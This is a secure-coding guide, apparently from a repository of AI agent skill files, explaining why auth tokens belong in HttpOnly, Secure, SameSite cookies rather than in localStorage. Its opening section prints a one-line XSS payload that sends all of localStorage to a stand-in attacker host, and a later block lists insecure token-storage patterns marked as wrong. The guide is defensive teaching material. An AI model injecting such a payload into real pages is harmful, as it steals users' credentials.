# Never store auth tokens in localStorage (or sessionStorage)

**Status:** Absolute rule — tokens stored in localStorage are XSS-exfiltratable. Use HttpOnly + Secure + SameSite cookies. Pair with CSRF defense.

**Domain:** Token storage

**Applies to:** `auth-identity`

---

## Why this exists

`localStorage` is accessible to any JavaScript running on your origin — including injected script from an XSS vulnerability. If an attacker can run JavaScript in your app (via a reflected, stored, or DOM-based XSS), they can read `localStorage` in full and exfiltrate every token in it:

```js
// An attacker's injected XSS payload — one line to steal every stored credential
fetch("https://attacker.example.com/steal?data=" + btoa(JSON.stringify(localStorage)));
```

An access token exfiltrated this way gives the attacker the same API access as the legitimate user. A refresh token exfiltrated this way gives the attacker persistent access until the token is revoked.

`sessionStorage` has the same vulnerability — it is also readable by any same-origin JavaScript.

**The fix is HttpOnly cookies.** The `HttpOnly` flag tells the browser never to expose the cookie to JavaScript — it is only sent in HTTP requests. An XSS payload cannot read it, cannot copy it, and cannot forward it to an attacker's server via JavaScript. The cookie is still sent automatically on legitimate same-origin requests.

This is a permanent architectural decision. There is no localStorage mitigation that makes token storage safe.

---

## How to apply

**Do:**

- Store session tokens in **HttpOnly + Secure + SameSite** cookies.
- Let the auth library manage cookie storage. Supabase Auth via `@supabase/ssr` stores all tokens in properly flagged cookies automatically. Auth.js does the same with the `cookies` adapter.
- Verify cookie flags in browser DevTools → Application → Cookies before deploying.

```
✅ Correct cookie flags:
Set-Cookie: sb-access-token=...; HttpOnly; Secure; SameSite=Lax; Path=/
Set-Cookie: sb-refresh-token=...; HttpOnly; Secure; SameSite=Strict; Path=/
```

- Pair with CSRF defense (`SameSite=Lax` minimum; CSRF token for state-mutating routes where `SameSite=Strict` is not appropriate). See `session-and-token-management` skill.

**Don't:**

```js
// ❌ NEVER — tokens in localStorage
localStorage.setItem("access_token", token);
localStorage.setItem("refresh_token", refreshToken);

// ❌ NEVER — tokens in sessionStorage (same vulnerability)
sessionStorage.setItem("jwt", token);

// ❌ NEVER — tokens in non-HttpOnly cookies (readable by JS)
document.cookie = "token=" + token; // no HttpOnly flag

// ❌ NEVER — tokens in React state persisted to localStorage via a persist library
// (e.g., Zustand with localStorage persistence middleware, Redux Persist)
const useAuthStore = create(persist(set => ({ token: null }), { name: 'auth' }));

// ❌ NEVER — raw token passed as a URL parameter (ends up in server logs + browser history)
window.location.href = `/dashboard?token=${accessToken}`;
```

---

## The SPA token-access problem (and the correct solution)

A common objection: "My SPA needs to read the token to call an API. If it's HttpOnly, the JavaScript can't see it."

The answer: **HttpOnly cookies are sent automatically by the browser on same-origin requests.** Your SPA does not need to read the token — it just makes the API call and the browser attaches the cookie.

```ts
// ✅ SPA calls API — cookie sent automatically, no JS token access needed
const response = await fetch("/api/data", {
  credentials: "include", // ensures cookies are sent on cross-origin requests
});

// ❌ WRONG mental model — SPA reads token from storage to attach as header
const token = localStorage.getItem("access_token");
const response = await fetch("/api/data", {
  headers: { Authorization: `Bearer ${token}` },
});
```

For cross-origin API calls (your SPA on `app.example.com` calls API on `api.example.com`), you need `credentials: 'include'` on the fetch and proper CORS headers including `Access-Control-Allow-Credentials: true` with a non-wildcard origin. See `protect-spa-and-api` skill.

If the API is an external service that requires a Bearer token (not your own API), issue a short-lived server-side proxy token — the SPA calls your server, which holds the credential and calls the external service. The SPA never receives the external API token.

---

## Edge cases / when this nuance applies

- **Very short-lived, low-value tokens:** some applications (e.g., read-only public API tokens with minimal permissions) store tokens in memory (React state, not localStorage) to avoid the CSRF complexity of cookies. In-memory storage is acceptable if: the token is short-lived, low-value, and the app has robust XSS defenses. This is not an exception for access or refresh tokens.
- **Native apps (iOS, Android):** use the platform's secure credential store (iOS Keychain, Android Keystore). Not localStorage.
- **Embed JWT (passed to dashboard embed):** short-lived, server-issued embed tokens are fetched from a server API route and passed directly to the embed component in memory — they are never stored in localStorage or a cookie. They expire in 5-15 minutes. See `data-platform/best-practices/issue-short-lived-jwts-for-embeds.md`.

---

## See also

- Skill: [`../skills/session-and-token-management/SKILL.md`](../skills/session-and-token-management/SKILL.md) — the full cookie-configuration discipline
- Skill: [`../skills/protect-spa-and-api/SKILL.md`](../skills/protect-spa-and-api/SKILL.md) — CORS + CSRF defense that pairs with cookie storage
- Best-practice: [`./validate-id-tokens-server-side.md`](./validate-id-tokens-server-side.md)
- OWASP: Session Management Cheat Sheet [unverified — verify at cheatsheetseries.owasp.org]
- Security escalation: [`../../ravenclaude-core/agents/security-reviewer.md`](../../ravenclaude-core/agents/security-reviewer.md)

## Provenance

Derived from OWASP Session Management Cheat Sheet and JWT Security Cheat Sheet [unverified], the `session-and-token-management` skill's storage anti-patterns section, and the `protect-spa-and-api` skill's CSRF defense section. The localStorage XSS-exfiltration vector is a long-standing, well-documented attack path (referenced in OWASP, RFC 8252, and OAuth 2.0 Security BCP [unverified]).

---

_Last reviewed: 2026-06-03 by `claude`_
